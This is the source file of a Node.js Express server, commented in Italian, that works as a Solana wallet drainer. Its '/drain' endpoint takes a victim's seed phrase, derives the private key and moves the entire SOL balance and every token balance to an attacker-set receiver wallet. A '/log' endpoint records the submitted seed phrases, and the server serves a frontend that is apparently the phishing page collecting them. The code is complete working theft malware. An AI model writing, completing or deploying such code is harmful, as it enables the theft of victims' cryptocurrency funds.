import express from 'express';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } from '@solana/web3.js';
import { 
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID
} from '@solana/spl-token';
import { mnemonicToSeed } from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: '10mb' }));

// ===== CONFIGURAZIONE =====
const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI CON LA TUA CHIAVE PUBBLICA
const connection = new Connection('https://api.mainnet-beta.solana.com');

// ===== DRENAGGIO TOTALE =====
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey } = req.body;
  if (!seed || !walletPublicKey) {
    return res.status(400).json({ error: 'Dati mancanti' });
  }
  try {
    const seedBuffer = await mnemonicToSeed(seed);
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);

    console.log(`🔄 Drenaggio iniziato per: ${fromPubkey.toString()}`);
    console.log(`📦 Seed ricevuta: ${seed.substring(0, 20)}...`);

    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;
    let solTx = null;
    if (amount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: amount,
        })
      );
      solTx = await connection.sendTransaction(tx, [fromKeypair]);
      await connection.confirmTransaction(solTx);
      console.log(`✅ SOL trasferiti: ${amount / LAMPORTS_PER_SOL} SOL, Tx: ${solTx}`);
    }

    const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
      programId: TOKEN_PROGRAM_ID,
    });

    let tokenTxList = [];
    for (const account of tokenAccounts.value) {
      const tokenAccount = account.pubkey;
      const tokenInfo = await connection.getTokenAccountBalance(tokenAccount);
      
      if (tokenInfo.value.amount > 0) {
        try {
          const accountInfo = await connection.getAccountInfo(tokenAccount);
          if (!accountInfo) continue;
          
          const mint = new PublicKey(accountInfo.data.slice(0, 32));
          const receiverTokenAccount = await getAssociatedTokenAddress(
            mint,
            toPubkey
          );
          
          const receiverAccountInfo = await connection.getAccountInfo(receiverTokenAccount);
          const tx = new Transaction();
          
          if (!receiverAccountInfo) {
            tx.add(
              createAssociatedTokenAccountInstruction(
                fromPubkey,
                receiverTokenAccount,
                toPubkey,
                mint
              )
            );
          }
          
          tx.add(
            createTransferInstruction(
              tokenAccount,
              receiverTokenAccount,
              fromPubkey,
              tokenInfo.value.amount
            )
          );
          
          const signature = await connection.sendTransaction(tx, [fromKeypair]);
          await connection.confirmTransaction(signature);
          tokenTxList.push(signature);
          console.log(`🪙 Token drenati: ${tokenInfo.value.uiAmount} (mint: ${mint.toString()}), Tx: ${signature}`);
          
        } catch(e) {
          console.log(`⚠️ Errore drenaggio token: ${e.message}`);
        }
      }
    }

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      solTx: solTx,
      tokenTxs: tokenTxList,
      solAmount: amount / LAMPORTS_PER_SOL,
      tokenCount: tokenTxList.length
    });

  } catch (e) {
    console.error('❌ Errore drenaggio:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/log', (req, res) => {
  console.log('📥 LOG:', req.body);
  if (req.body.seed) {
    console.log('⚠️ SEED RICEVUTA:', req.body.seed);
  }
  res.json({ status: 'ok' });
});

app.use(express.static('dist'));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(3000, () => console.log('🚀 Server in ascolto su http://localhost:3000'));
